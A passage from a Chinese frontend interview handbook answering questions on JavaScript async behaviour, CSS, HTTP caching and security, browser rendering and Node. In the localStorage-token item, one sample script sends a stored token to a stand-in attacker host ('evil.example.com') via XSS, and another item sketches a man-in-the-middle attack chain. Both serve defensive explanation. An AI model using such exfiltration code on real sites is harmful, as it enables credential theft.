- 访问器描述符是 get/set，与 value/writable 互斥，不能同时出现。
- 默认全为 false/undefined，所以 defineProperty 创建的属性默认不可枚举不可写——Vue2 响应式、JSON 序列化丢字段都与此有关。

```javascript
const o = {};
Object.defineProperty(o, 'id', {
  value: 1, writable: false, enumerable: false, configurable: false,
});
o.id = 2;                            // 静默失败（严格模式下报错）
console.log(Object.keys(o), o.id);   // [] 1 —— 不可枚举但可访问
console.log(JSON.stringify(o));      // {} —— JSON 序列化只看可枚举属性
```

### BAS-140：new 一个函数时属性查找顺序是怎样的？（原型链经典输出题）
**答**：
- new 做四件事：创建空对象 → 链到构造函数的 prototype → 以 this 执行构造函数 → 无显式返回对象时返回新对象。
- 属性查找先看自有属性，找不到沿 `__proto__` 逐级上溯到 Object.prototype，再没有就是 undefined。
- constructor 属性本身定义在构造函数的 prototype 上。

```javascript
function Foo() { this.a = 1; }
Foo.prototype.a = 2;
Foo.prototype.b = 3;
const f = new Foo();
console.log(f.a);                   // 1 —— 自有属性优先于原型上的同名属性
console.log(f.b);                   // 3 —— f 自身没有，沿 __proto__ 到 Foo.prototype 找到
console.log(f.c);                   // undefined —— 一路找到 Object.prototype 仍没有
console.log(f.constructor === Foo); // true —— constructor 就挂在 Foo.prototype 上
```

## 十六、异步与事件循环补充

### BAS-141：宏任务微任务基础输出题：这段代码输出什么？
**答**：
- 同步代码最先执行完：1、4。
- 整个同步栈清空后立即清空微任务队列：3；然后才取宏任务：2。
- 速记口诀：同步 → 微任务清空 → 一个宏任务 → 再清微任务，循环往复。

```javascript
console.log(1);                                // 同步
setTimeout(() => console.log(2), 0);           // 宏任务
Promise.resolve().then(() => console.log(3)); // 微任务
console.log(4);                                // 同步
// 输出 1 4 3 2：同步跑完 → 清微任务 → 取宏任务
```

### BAS-142：Promise 链与 setTimeout 混合输出题
**答**：
- then 链的每一步都是独立微任务，且必须等上一步结算后才入队。
- 所以 then 回调之间不会插进宏任务：2、3 先于 1 输出。
- 常见误区：以为 setTimeout(0) 比三个 then 里的第二步先跑。

```javascript
setTimeout(() => console.log(1));
Promise.resolve()
  .then(() => { console.log(2); return 3; })  // 微任务1
  .then(v => console.log(v));                 // 微任务2，等微任务1结算后才入队
console.log(4);
// 输出 4 2 3 1：then 链每步之间宏任务插不进来
```

### BAS-143：async/await 与同步代码混合输出题（逐行解析）
**答**：
- async 函数调用后同步执行到第一个 await 之前的部分。
- await 后面的代码相当于注册为微任务，且 await 非 promise 值（如 null）也会暂停、下一轮微任务才继续。
- 主线程不等待 async 函数，继续跑同步代码，所以 B 在 C 前。

```javascript
async function run() {
  console.log('A');   // 调用时同步执行
  await null;         // 即使不是 promise 也暂停，剩余代码进微任务
  console.log('C');   // 微任务阶段才执行
}
console.log('start');
run();
console.log('B');     // 同步代码优先于微任务
// 输出 start A B C
```

### BAS-144：async 函数的返回值是怎么被包装的？
**答**：
- return 的值一律被 `Promise.resolve()` 包装；返回另一个 promise 时跟随它的最终状态。
- throw 等价于返回 rejected promise，错误会变成 Promise 拒绝而不是同步异常。
- 所以 `async fn()` 的结果永远可以安全地 .then/.catch。

```javascript
async function f() { return 1; }
f().then(console.log);              // 1 —— 返回值自动 Promise.resolve 包装

async function g() { return Promise.resolve(2); }
g().then(console.log);              // 2 —— 返回 promise 时跟随其状态

async function h() { throw new Error('x'); }
h().catch(e => console.log('rejected', e.message)); // throw 等价于 reject
```

### BAS-145：try/catch 能捕获异步错误吗？
**答**：
- 捕获不到回调型异步错误：setTimeout 里 throw 的错误发生在 try 块之外，只能靠 window.onerror 或进程级 uncaughtException。
- await 的拒绝发生在当前 async 函数作用域内，可以被 try/catch 捕获——这是 async/await 相对 then 链的最大工程优势。
- Promise 构造器内 throw 会被引擎转为 reject，不会变成未捕获异常。

```javascript
try {
  setTimeout(() => { throw new Error('async boom'); }, 0);
} catch (e) { console.log('抓不到'); }   // catch 执行时错误还没发生

async function run() {
  try { await Promise.reject(new Error('rejection')); }
  catch (e) { console.log('能抓到', e.message); }   // await 的拒绝可捕获
}
run();
```

### BAS-146：Promise 的 finally 什么时候执行？会改变结果吗？
**答**：
- 无论 fulfill 还是 reject 都会执行，且回调不接收参数，适合放清理逻辑。
- finally 的返回值默认被忽略，结果原样向下传递；但如果回调内部 throw，会替换为新的失败。
- 常用场景：loading 开关、关闭弹窗、释放资源，成功失败两条路只写一份。

```javascript
Promise.resolve('ok')
  .finally(() => 'ignored')       // 返回值被忽略，不改变结果
  .then(v => console.log(v));     // ok

Promise.reject(new Error('x'))
  .finally(() => console.log('清理资源')) // 成功失败都执行
  .catch(e => console.log(e.message));    // x，失败状态继续向下透传
```

### BAS-147：什么是 Promise 链的"值穿透"？
**答**：
- then/catch/finally 传入非函数参数时，不会处理值，而是把上游的值或失败状态原样透传给下一个函数型回调。
- 典型表现：`.then(1)` 之后的 then 拿到的还是上游的值；rejected 状态会一直穿透到第一个 catch。
- 用途：catch(null) 式的占位、条件化组装链时跳过某几步。

```javascript
Promise.resolve('v')
  .then(1)                                  // 非函数，值穿透
  .then(null)
  .then(v => console.log(v));               // v —— 透传到第一个函数型 then

Promise.reject(new Error('skip'))
  .then(() => console.log('不会执行'))
  .catch(e => console.log('失败也穿透', e.message)); // 跳过 then 直达 catch
```

### BAS-148：Promise 构造函数是同步执行的吗？resolve 之后再 throw 会怎样？
**答**：
- executor 是同步执行的，`new Promise` 的瞬间函数体就跑完；then 回调才是异步的。
- 状态一旦定型（fulfilled 或 rejected）就不可再变：resolve 之后再 throw、再 resolve 都会被静默忽略。
- 考点延伸：executor 里写同步报错等价于 reject；但异步回调里 throw 不会被捕获，要小心。

```javascript
const p = new Promise((resolve) => {
  console.log('executor 同步执行'); // new 的瞬间就打印
  resolve('done');
  throw new Error('too late');      // 被忽略：状态已定型为 fulfilled
});
p.then(console.log);                // done
console.log('after new');           // 顺序：executor 同步 → after new → done
```

### BAS-149：循环里 await 的串行和并行怎么写？差在哪？
**答**：
- `for...of` 里 await：每次等上一个请求完成才发下一个，串行，总耗时是各次之和。
- `map + Promise.all`：先把所有请求同时发出，再统一等待，总耗时约等于最慢的那一个。
- 注意并行版不会保持 for-await 那种逐个处理的节奏，若后一个依赖前一个结果只能串行。

```javascript
const urls = ['/a', '/b', '/c'];

// 串行：一个完成再发下一个，总耗时相加
for (const u of urls) await fetch(u);

// 并行：同时发起，总耗时约等于最慢的一个
await Promise.all(urls.map(u => fetch(u)));
```

### BAS-150：事件循环和浏览器渲染的顺序是什么？requestAnimationFrame 排在哪？
**答**：
- 一帧内的顺序：清空同步代码与微任务 → 执行 rAF 回调 → 样式计算、布局、绘制 → 空闲后才取下一个宏任务。
- rAF 回调在绘制前执行，所以它拿到的 DOM 状态就是本帧要画的；微任务在每次宏任务结束后、渲染前清空。
- 这也是为什么连续同步修改样式再读 offsetWidth 会强制同步布局，而改样式放 rAF 能对齐渲染节奏。

```javascript
requestAnimationFrame(() => console.log('rAF'));
setTimeout(() => console.log('timeout'), 0);
Promise.resolve().then(() => console.log('micro'));
// 常见输出：micro → rAF → timeout
// 微任务先清空，rAF 在本次绘制前执行，setTimeout 通常落到下一帧
```

```mermaid
flowchart TD
    A[一次事件循环] --> B[执行同步代码]
    B --> C[清空微任务队列]
    C --> D[执行 rAF 回调]
    D --> E[样式计算与布局绘制]
    E --> F[取一个宏任务执行]
    F --> C
```

## 十七、CSS 进阶速答

### BAS-151：哪些情况会创建新的层叠上下文？
**答**：
- 基础条件：根元素；定位元素（absolute/fixed/sticky/relative）且 z-index 非 auto。
- 隐式条件高频考点：opacity 小于 1、transform/filter/perspective/mask 非 none、isolation: isolate、will-change 指定了层叠相关属性。
- 关键推论：层叠上下文是一个整体，内部元素的 z-index 只在上下文内部比较，出不去外部。

```css
html { }                                  /* 根元素天然是一个层叠上下文 */
.a { position: absolute; z-index: 1; }    /* 定位 + 非 auto 的 z-index */
.b { opacity: 0.99; }                     /* 小于 1 即创建 */
.c { transform: translateZ(0); }
.d { filter: blur(1px); }
.e { isolation: isolate; }                /* 最小成本的主动创建方式 */
.f { will-change: transform; }
```

### BAS-152：inherit、initial、unset、revert 分别是什么效果？
**答**：
- inherit：强制继承父元素的值，即使该属性默认不继承。
- initial：回到 CSS 规范定义的属性初始值（注意 display:initial 是 inline，不是浏览器默认的 block）。
- unset：可继承属性当 inherit，不可继承属性当 initial；revert：回退到浏览器默认样式表（user-agent），比 initial 更接近"撤销作者样式"。

```css
a { color: red; }
.reset a {
  color: inherit;   /* 强制继承父级颜色 */
  border: initial;  /* 属性规范初始值 none */
  margin: unset;    /* margin 不可继承 → 等价 initial */
  padding: revert;  /* 回退到浏览器 UA 样式表 */
}
```

### BAS-153：width 的 max-content、min-content、fit-content 分别什么效果？
**答**：
- max-content：内容完全不换行时的理想宽度（一整行长句撑开）。
- min-content：按最宽的不可拆分单元（最长单词/图片）收缩到最窄。
- fit-content(上限)：先用 max-content，超了就收缩，但不超过给定上限；三者都可用 min()/max-content 系列做自适应卡片。

```css
.button { width: max-content; }        /* 按文本总宽撑开，不换行 */
.tag { width: min-content; }           /* 收缩到最长单词的宽度 */
.card { width: fit-content(320px); }   /* 内容宽优先，最大不超过 320px */
/* 三者都是 intrinsic sizing，常用于按钮、标签、聊天气泡 */
```

### BAS-154：min()、max()、clamp() 有什么实际应用？
**答**：
- min(a, b) 取较小值：`width: min(300px, 100%)` 表示"最多 300px，窄屏时贴满"。
- max(a, b) 取较大值：保证间距或尺寸的下限。
- clamp(min, 理想值, max)：三者合一，最典型是流式排版——字号随视口缩放但被夹在两端之间。

```css
h1 { font-size: clamp(24px, 5vw, 48px); }  /* 视口缩放但夹在 24~48px */
.sidebar { width: min(300px, 100%); }      /* 最多 300px，小屏贴满 */
.gutter { margin: max(16px, 4vh); }        /* 间距保底 16px */
```

### BAS-155：color-mix() 怎么用？什么是色彩空间？
**答**：
- color-mix(in 空间, 颜色A 百分比, 颜色B)：按指定插值空间混合两个颜色，省去手算 hover/边框色值。
- in 后面是插值空间：srgb 传统混色、oklch/oklab 感知均匀（过渡更自然）、hsl 常用于调饱和度。
- 色彩空间决定"两点之间怎么连线"，不同空间同样配比混出的颜色不同。

```css
.btn {
  color: color-mix(in srgb, teal 70%, white);   /* 七成 teal 掺白 */
  border: 1px solid color-mix(in oklch, crimson, black 20%); /* 感知更均匀的暗色 */
  background: color-mix(in oklch, currentColor, transparent 85%); /* 弱化底色 */
}
```

### BAS-156：currentColor 是什么？有什么典型用法？
**答**：
- currentColor 引用元素自身的 color 计算值，是 CSS 里的"活引用"。
- 典型用法：边框/阴影跟随文字颜色、SVG 图标 fill 继承文字颜色——只改一处 color，整组视觉同步变化。
- 补充：border-color 等缺省值本身就是 currentColor。

```css
.link {
  color: #1677ff;
  border: 1px solid currentColor;  /* 边框跟随文字颜色 */
  box-shadow: 0 0 0 3px color-mix(in srgb, currentColor 30%, transparent);
}
.link:hover { color: #4096ff; }    /* 改一处，边框阴影一起变 */
.icon { fill: currentColor; }      /* SVG 图标继承文字颜色 */
```

### BAS-157：多层 box-shadow 怎么写？性能上要注意什么？
**答**：
- 多层阴影逗号分隔、按"近小远大"叠加，可模拟真实的柔光投影。
- box-shadow 变化不触发重排，但大模糊半径会扩大绘制区域，动画阴影会拖慢 paint。
- 优化：需要"阴影动起来"的效果优先用伪元素 + opacity 过渡，或 transform 让整个层走合成。

```css
.card {
  /* 多层阴影逗号分隔，从近到远叠加出立体感 */
  box-shadow:
    0 1px 2px rgba(0, 0, 0, .08),
    0 4px 8px rgba(0, 0, 0, .12),
    0 16px 32px rgba(0, 0, 0, .16);
}
/* hover 要动阴影时：切 opacity 而不是动 blur，避免重绘开销 */
```

### BAS-158：border-radius 用百分比有什么效果？
**答**：
- 水平/垂直半径按盒子宽高各自的百分比取，50% 在正方形上就是正圆（50% = 半径取一半）。
- 语法 `水平 / 垂直`：斜杠前后分开设 8 个值，可画出叶子、水滴、花瓣等有机形状。
- 长方形上 50% 得到的是椭圆角，想要"胶囊"效果写一个大像素值（如 999px）即可自动收缩。

```css
.avatar { border-radius: 50%; }  /* 正方形变正圆 */
.leaf {
  border-radius: 0 50% 0 50%;            /* 两角对称变叶子 */
}
.drop {
  border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%; /* 斜杠分水平垂直半径 */
}
.pill { border-radius: 999px; }  /* 高度一半的胶囊形，高度变了也安全 */
```

### BAS-159：table 布局在现在还有什么用？
**答**：
- 真正的数据表格（语义正确）仍是 table 的本职；配合 `table-layout: fixed` 让列宽稳定、渲染更快。
- display: table/table-cell 在老兼容场景可以低成本实现等高列和垂直居中（现代首选 grid/flex）。
- 面试定位：知道它是历史方案之一，能说清什么时候别再滥用它做布局。

```css
/* 老兼容场景：等高列 + 垂直居中 */
.form { display: table; }
.row { display: table-row; }
.label, .field {
  display: table-cell;
  vertical-align: middle;   /* table-cell 才能吃到垂直居中 */
}
/* 真实数据表格建议：table-layout: fixed 锁定列宽 */
table { table-layout: fixed; width: 100%; }
```

### BAS-160：writing-mode 怎么实现竖排文字？
**答**：
- `vertical-rl` 从右往左竖排（古文、日文），`vertical-lr` 从左往右；text-orientation: upright 让拉丁字符直立。
- 竖排会改变块的流动方向：block 方向变成水平，行内方向变成垂直，margin/padding 的"上下"感知要换脑。
- 典型场景：书脊文字、侧边标签、诗歌排版；配合 logical properties 不受影响。

```css
.vertical {
  writing-mode: vertical-rl;   /* 从右往左竖排 */
  text-orientation: mixed;     /* 中文字直立，英文旋转 90 度 */
}
.spine {
  writing-mode: vertical-rl;   /* 书脊/侧边标签常用 */
  text-orientation: upright;   /* 拉丁字符也逐字直立 */
}
```

### BAS-161：::selection 伪元素能改什么？
**答**：
- 定制文本被选中时的样式，只支持少数属性：color、background-color、background、text-shadow、text-decoration、-webkit-text-stroke 等。
- 不支持字号、字体族等影响布局的属性（防止选区重排）。
- 常见用途：品牌主题色选区、深色模式下的选区可读性修正。

```css
::selection {
  background: #1677ff;
  color: #fff;
  text-shadow: none;   /* 只允许 color/background/text-shadow 等少数属性 */
}
.dark ::selection {    /* 深色模式下避免蓝底黑字看不清 */
  background: #4096ff;
  color: #111;
}
```

### BAS-162：prefers-color-scheme 和 prefers-contrast 怎么用？
**答**：
- prefers-color-scheme: dark/light 跟随系统深色模式，配合 CSS 变量做主题切换是零 JS 方案。
- prefers-contrast: more/no-preference 响应用户的对比度偏好，增强可访问性（无障碍审计常查）。
- 两者都是 user preference media features，同理还有 prefers-reduced-motion（减少动效）。

```css
:root { --bg: #fff; --fg: #222; }
@media (prefers-color-scheme: dark) {
  :root { --bg: #111; --fg: #eee; }   /* 跟随系统深色模式 */
}
@media (prefers-contrast: more) {
  .btn { border: 2px solid currentColor; }  /* 对比度增强时加边框 */
}
body { background: var(--bg); color: var(--fg); }
```

## 十八、HTTP 与安全速答补充

### BAS-163：HTTP/2 还有队头阻塞问题吗？
**答**：
- 应用层的队头阻塞解决了：多路复用让多个流在同一条连接上交错传输，互不等待。
- 但 TCP 层的还在：TCP 只保证字节流有序，任何一个包丢失，所有流的后续数据都要等重传补齐。
- 高丢包率下 HTTP/2 单连接甚至可能不如 HTTP/1.1 多连接——这正是 HTTP/3 改用 QUIC 的动机。

```http
# HTTP/2 二进制分帧：多个流在一条 TCP 连接上交错
# 流 A 的帧 -- 流 B 的帧 -- 流 A 的帧   （应用层不再排队）
# 但 TCP 层：seq=1001 丢了，内核会扣住 seq=1002 之后的所有字节
# 于是流 A 和流 B 一起卡住，这就是 TCP 队头阻塞
GET / HTTP/2
Host: example.com
```

### BAS-164：HTTP/3 与 QUIC 的核心特性速记？
**答**：
- 传输层换 UDP + QUIC：TLS 1.3 内建进握手，首次连接 1-RTT，重连可 0-RTT。
- 连接迁移：靠 Connection ID 识别连接，Wi-Fi 切 4G 不掉线（TCP 换 IP 必断）。
- 每条流独立确认与重传，彻底消除 TCP 队头阻塞；头部压缩用 QPACK 替代 HPACK。

```http
# HTTP/3 = HTTP over QUIC over UDP
# 1. 内建 TLS 1.3：握手与加密合并，1-RTT 建连，会话恢复 0-RTT
# 2. Connection ID：网络切换 IP 变了连接还在
# 3. 流级别独立丢包恢复：一条流丢包不再拖累其他流
# 4. QPACK 头部压缩、所有传输数据强制加密
```

### BAS-165：HTTPS 证书链验证的基本流程是什么？
**答**：
- 服务器下发叶子证书 + 中间证书；浏览器用上级公钥逐级验证签名，直到命中系统信任库里预置的根证书。
- 同时校验：域名 SAN 匹配、有效期、吊销状态（CRL/OCSP）。
- 经典故障：服务器漏发中间证书，桌面浏览器有时能靠 AIA 补齐，移动端/App 内 WebView 直接报错。

```http
# 浏览器验证顺序：从叶子证书逐级向上追到受信任的根
叶子证书 example.com
  ↑ 由中间 CA 的私钥签名
中间 CA 证书
  ↑ 由根 CA 的私钥签名
根 CA 证书 —— 预置在系统信任库，离线保存，绝不下发到服务器
# 校验点：各级签名、域名 SAN、有效期、吊销状态 CRL 与 OCSP
```

### BAS-166：中间人攻击在什么条件下成立？怎么防？
**答**：
- 前提是攻击者能劫持流量（公共 WiFi、DNS 污染、代理）+ 客户端信任了攻击者的证书。
- 明文 HTTP 下可直接改包；HTTPS 下必须伪造证书——自签 CA 没被导入信任库就会告警，浏览器证书告警就是拦在这里。
- 防御：全站 HTTPS、HSTS 防降级、关键客户端做证书锁定（SSL Pinning）。

```http
# 攻击链：劫持流量 + 让客户端信任假证书
1. 公共 WiFi ARP 欺骗，流量先过攻击者
2. 明文 HTTP：直接替换响应注入脚本
3. HTTPS：返回自签名的假证书 —— 用户点"继续访问"就沦陷
4. 防御：响应头开启 HSTS 强制 HTTPS，杜绝降级
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

### BAS-167：localStorage 存 token 有什么安全风险？
**答**：
- localStorage 完全开放给同源 JS：页面只要存在任意 XSS 注入点，token 就能被读走外传。
- 对比之下 HttpOnly cookie 的会话凭证 XSS 读不到——所以"localStorage 比 cookie 安全"是个常见误区。
- 实践：敏感凭证优先 HttpOnly + Secure + SameSite 的 cookie；localStorage 只放非敏感数据，同时把 XSS 防住才是根本。

```html
<!-- 页面存在任意一个 XSS 注入点，localStorage 里的内容全部可读 -->
<script>
  fetch('https://evil.example.com/collect?t=' + localStorage.getItem('token'));
</script>
<!-- 对比：HttpOnly 的 cookie 同样的 XSS 读不到 -->
<!-- 结论：凭证放 HttpOnly cookie，localStorage 放主题、草稿等非敏感数据 -->
```

### BAS-168：preload、prefetch、dns-prefetch、preconnect 有什么区别？
**答**：
- dns-prefetch：只提前 DNS 解析，成本最低，适合第三方域。
- preconnect：提前完成 DNS + TCP + TLS 全套握手，适合确定要请求的关键第三方域。
- preload：当前页面马上要用的高优先级资源（字体、关键 CSS/JS），as 必须写对；prefetch：空闲时下载未来导航可能用的资源，优先级低。

```html
<link rel="dns-prefetch" href="//cdn.example.com">
<!-- 只提前 DNS 查询 -->
<link rel="preconnect" href="https://cdn.example.com" crossorigin>
<!-- DNS + TCP + TLS 全部提前 -->
<link rel="preload" as="font" href="/brand.woff2" crossorigin>
<!-- 当前页马上要用的字体，as 与 crossorigin 必须匹配否则会二次下载 -->
<link rel="prefetch" href="/checkout.js">
<!-- 空闲时预取下一页可能用的资源 -->
```

### BAS-169：301、302、307（和 308）重定向有什么区别？
**答**：
- 301 永久、302 临时：历史遗留问题是浏览器可能把 POST 改写成 GET（搜索引擎据此迁移权重也只认 301）。
- 307 临时、308 永久：严格保持原请求方法，POST 重定向后仍是 POST。
- 速记：要保方法选 307/308；301 用于域名迁移、URL 永久变更，302 用于临时跳转如登录回跳。

```http
HTTP/1.1 301 Moved Permanently
Location: https://new.example.com/a   # 永久，方法可能被降级为 GET

HTTP/1.1 302 Found
Location: /b                          # 临时，方法同样可能被改写

HTTP/1.1 307 Temporary Redirect
Location: /c                          # 临时且严格保持 POST 等 method
# 308 Permanent Redirect：永久且保持 method
```

### BAS-170：Vary 响应头有什么作用？
**答**：
- 告诉缓存（浏览器、CDN、代理）：响应内容会随 Vary 列出的请求头不同而不同，缓存时必须按这些头的组合分别存副本。
- 典型值 `Vary: Accept-Encoding`——gzip 版和原始版要分开缓存，否则会把压缩响应发给不支持的客户端。
- 坑：`Vary: User-Agent` 会让缓存键爆炸、命中率暴跌，能不用就不用。

```http
# 响应示例
Content-Encoding: gzip
Vary: Accept-Encoding
# 含义：缓存按请求头 Accept-Encoding 的取值分桶
# 同一 URL 下 gzip 版本与 identity 版本各存一份
# 面试追问：Vary: User-Agent 会导致缓存碎片化，命中率暴跌
```

### BAS-171：ETag 和 Last-Modified 怎么协作？缓存决策链是什么？
**答**：
- Last-Modified 是时间戳验证器（秒级精度、内容不变改时间也会失效）；ETag 是内容指纹（强验证器，优先级更高）。
- 协商缓存请求同时带上 If-None-Match 与 If-Modified-Since，服务器优先比对 ETag，都没变才回 304。
- 完整链路：强缓存（Cache-Control 未过期）→ 命中即用；否则走协商缓存 → 304 用本地或 200 拉新。

```http
# 首次响应同时下发两个验证器
ETag: "abc123"
Last-Modified: Wed, 21 Oct 2025 07:28:00 GMT

# 过期后的协商缓存请求
If-None-Match: "abc123"            # 优先比对，内容指纹最准
If-Modified-Since: Wed, 21 Oct 2025 07:28:00 GMT
# 都未变化 → 304 Not Modified（无响应体）
```

```mermaid
flowchart TD
    A[请求资源] --> B{强缓存未过期}
    B -- 是 --> C[直接读本地副本不发请求]
    B -- 否 --> D{有 ETag 或 Last-Modified}
    D -- 有 --> E[发协商缓存请求带 If 系列头]
    E --> F{服务端比对验证器}
    F -- 未变化 --> G[返回 304 用本地副本]
    F -- 已变化 --> H[返回 200 新资源与新验证器]
    D -- 没有 --> H
```

### BAS-172：Referer 和 Referrer-Policy 是什么关系？
**答**：
- 请求头拼写就是 Referer（少个 r，历史遗留），而标准属性叫 Referrer-Policy——这本身就是考点。
- 现代默认 strict-origin-when-cross-origin：同源带完整 URL，跨域只带 origin，HTTPS→HTTP 不带。
- 作用是控制 URL 泄漏面：隐私路径、内网地址、token 参数不该发给第三方；`<meta name="referrer">` 或响应头可设置。

```http
Referer: https://old.example.com/page?q=secret   # 拼写就是少个 r

# 策略响应头或 meta 控制
Referrer-Policy: strict-origin-when-cross-origin  # 现代浏览器默认
# no-referrer：一律不发
# same-origin：仅同源请求带完整 URL
# 防 URL 里的 token 与内网路径泄漏给第三方站点
```

## 十九、浏览器与渲染补充

### BAS-173：CSSOM 和关键渲染路径是什么关系？
**答**：
- 关键渲染路径：HTML 解析成 DOM、CSS 解析成 CSSOM → 两者合成渲染树 → Layout 算几何 → Paint 绘制上屏。
- CSSOM 构建完成前浏览器不渲染（CSS 阻塞渲染），这就是"首屏关键 CSS 内联"优化的依据。
- JS 会阻塞 DOM 解析（同步脚本），而渲染树不含 display:none 节点和 head，但含伪元素。

```html
<!-- 关键渲染路径四步 -->
<!-- 1. 解析 HTML 建 DOM；解析 CSS 建 CSSOM，CSSOM 没建完不渲染 -->
<!-- 2. DOM + CSSOM 合成渲染树，display:none 与 head 不进树，伪元素会进 -->
<!-- 3. Layout 计算几何，4. Paint 绘制、Composite 合成上屏 -->
<link rel="stylesheet" href="critical.css" />
<!-- 优化点：压缩阻塞资源、首屏 CSS 内联、非关键 CSS 异步加载 -->
```

### BAS-174：什么是合成层？层爆炸是怎么回事？
**答**：
- 合成层（compositing layer）单独拥有纹理，动画时只由合成线程重绘自己，不走主线程布局绘制。
- 但每个层都要占显存，页面上几十上百个被提升的元素就是"层爆炸"，内存和合成开销反而失控。
- 排查手段：DevTools 的 Layers 面板看层数与每层内存；治理靠只提升动画元素、动画结束移除提升。

```css
/* 滥用提升 → 层爆炸：每个元素一块纹理，显存爆涨 */
.card-1, .card-2, .card-3, .card-4 { transform: translateZ(0); }
/* 治理：只提升真正做动画的元素，其余用更轻的隔离 */
.lazy-paint { contain: paint; }
/* DevTools → Layers 面板可查看层总数与每层内存占用 */
```

### BAS-175：把元素提升为合成层有哪些手段？为什么 transform 动画快？
**答**：
- 手段：will-change: transform、transform 非 none（如 translateZ(0) hack）、opacity < 1、filter、position: fixed 等。
- transform/opacity 动画快，是因为它们只发生在合成阶段，跳过 Layout 和 Paint，主线程卡住时也能靠合成线程维持。
- 代价是显存，所以 will-change 要"用时加、用完删"，别全局铺开。

```css
.promote { will-change: transform; }  /* 提前告知浏览器要动画，预先提升 */
.hack { transform: translateZ(0); }   /* 老式强制提升 hack，能救急也易滥用 */
/* transform 动画只走合成线程：跳过 layout 与 paint */
.animate { transition: transform .2s; }
.animate:hover { transform: translateX(10px); }
```

### BAS-176：字体加载的 FOIT 和 FOUT 是什么？font-display 怎么选？
**答**：
- FOIT：字体加载期间文字隐形（不渲染），用户看到空白闪一下；FOUT：先用后备字体渲染，字体到了再切换，产生布局跳动。
- font-display：block（短 FOIT）、swap（直接 FOUT，最常用）、fallback（100ms 隐形 + 短暂后备窗口）、optional（超时不加载，交给浏览器决定）。
- 正文文字一般选 swap 保证可见性；装饰性字体可接受 optional 避免闪动。

```css
@font-face {
  font-family: Brand;
  src: url('/brand.woff2') format('woff2');
  font-display: swap;   /* 先用后备字体渲染 FOUT，字体到了再换 */
}
h1 { font-family: Brand, system-ui, sans-serif; }
/* block 短暂隐形 FOIT；optional 超时直接放弃，交给浏览器 */
```

### BAS-177：iframe 的加载对主页面有什么影响？
**答**：
- 主页面 load 事件要等所有 iframe 加载完，慢广告 iframe 会拖长整体加载时间。
- 跨源 iframe 运行在独立渲染进程（站点隔离），崩溃不影响主页面，但 postMessage 通信有成本。
- 优化：`loading="lazy"` 延迟到视口附近再加载，或 onload 后再赋 src；iframe 内资源与主页面不共享缓存键策略要单独考虑。

```html
<!-- load 事件会等 iframe，慢 iframe 拖慢主页面 -->
<iframe src="https://ads.example.com" loading="lazy" title="广告"></iframe>
<!-- loading=lazy 视口外不加载；或 JS 里先不设 src，onload 后再赋值 -->
<!-- 跨源 iframe 独立进程：崩溃隔离，但通信要走 postMessage -->
```

### BAS-178：target="_blank" 打开的页面和原页面是什么关系？rel="noopener" 为什么高频？
**答**：
- window.open 或无 rel 的 target=_blank 打开的窗口，可通过 window.opener 引用回原窗口，跨源下也能把它 location 跳到钓鱼页（Reverse Tabnabbing 攻击）。
- 防御：`rel="noopener"`（切断 opener 引用）；`rel="noreferrer"` 顺带不带 Referer。
- 现代浏览器对 target=_blank 已默认隐式 noopener，但显式写出仍是规范做法，面试答"必须加"。

```html
<!-- 不安全：新页面能拿到 window.opener 反向操控原页面 -->
<a href="https://unknown.example.com" target="_blank">有风险</a>
<!-- 安全写法：noopener 切断引用，noreferrer 连 Referer 一起隐藏 -->
<a href="https://unknown.example.com" target="_blank" rel="noopener noreferrer">安全外链</a>
<!-- window.open 返回的窗口同理：被打开页可通过 window.opener 访问原窗口 -->
```

### BAS-179：Cookie 的常用属性有哪些？速查一遍。
**答**：
- 生命周期：Expires（绝对时间）/ Max-Age（秒数，优先级更高；0 或负数即删除）。
- 作用域：Domain（省略则不含子域）、Path；安全：Secure（仅 HTTPS）、HttpOnly（JS 不可读）、SameSite（Lax/Strict/None 防 CSRF）。
- 单条约 4KB、每域数量有限；设置了 Domain 的 cookie 才会带去子域。

```http
Set-Cookie: sid=abc123; Max-Age=3600; Domain=example.com; Path=/;
  Secure; HttpOnly; SameSite=Lax
# Max-Age=0 即删除；Domain 省略则仅当前主机，不含子域
# HttpOnly 防 XSS 读，Secure 仅 HTTPS 传输，SameSite=Lax 拦大部分跨站请求
# 单条上限约 4KB，超出会被静默丢弃
```

### BAS-180：浏览器的进程和线程怎么划分？哪些共享、哪些隔离？
**答**：
- 进程：浏览器主进程、网络进程（所有标签共享）、GPU 进程（所有标签共享）、每个站点独立的渲染进程、插件进程。
- 渲染进程内：主线程（JS + 布局绘制调度）、合成线程、光栅线程、多个 Worker 线程；Worker 不能碰 DOM，靠 postMessage 通信。
- 隔离体现在进程崩溃互不影响（站点隔离）；共享体现在网络与 GPU 进程全局复用。

```javascript
// 渲染进程内的线程分工
// 主线程：跑 JS、DOM、样式布局，卡它就是卡页面
// 合成线程 + 光栅线程：滚动与 transform 动画即使主线程忙也能动
// Worker 线程：与主线程隔离，postMessage 通信，无 DOM 访问权
new Worker('/heavy.js');           // 计算密集任务丢给 Worker
console.log('主线程继续可响应');
```

```mermaid
graph TD
    A[浏览器进程体系] --> B[浏览器主进程<br/>界面与调度]
    A --> C[网络进程<br/>所有标签页共享]
    A --> D[GPU 进程<br/>所有标签页共享]
    A --> E[渲染进程<br/>站点隔离每站独立]
    A --> F[插件进程]
    E --> E1[主线程<br/>JS 与布局]
    E --> E2[合成线程]
    E --> E3[光栅线程]
    E --> E4[Worker 线程]
```

## 二十、Node 与 CLI 基础

### BAS-181：require 的模块解析顺序是什么？
**答**：
- 顺序：require 缓存（require.cache）→ Node 核心模块（fs/path 等）→ 相对或绝对路径 → 裸模块名去 node_modules 逐级向上找。
- 路径解析细节：先按文件名，依次补 .js/.json/.node 后缀；是目录则读 package.json 的 main，没有再找 index.js。
- 模块首次加载后会缓存，二次 require 拿的是同一实例。

```javascript
// require('util') 的查找顺序
// 1. 缓存命中：require.cache 里直接返回同一实例
// 2. 核心模块：fs、path、http 等
// 3. 相对路径：./file → 尝试 file.js / file.json / file.node
//    是目录则读 package.json 的 main，再不行找 index.js
// 4. 裸模块名：从当前目录 node_modules 逐级向上查找
const path = require('path');   // 核心模块，最快
```

### BAS-182：npm 包支持 ESM 要在 package.json 里配什么？
**答**：
- `type: "module"`：让 .js 文件按 ESM 解析（否则默认 CommonJS）。
- exports：现代入口声明，限定外部能导入的子路径，优先级高于 main，支持 import/require 双条件。
- 双格式包惯例：module 字段给打包器提示 ESM 版本，exports 里用条件导出精确分流。

```json
{
  "name": "pkg",
  "type": "module",
  "main": "./dist/index.cjs",
  "module": "./dist/index.js",
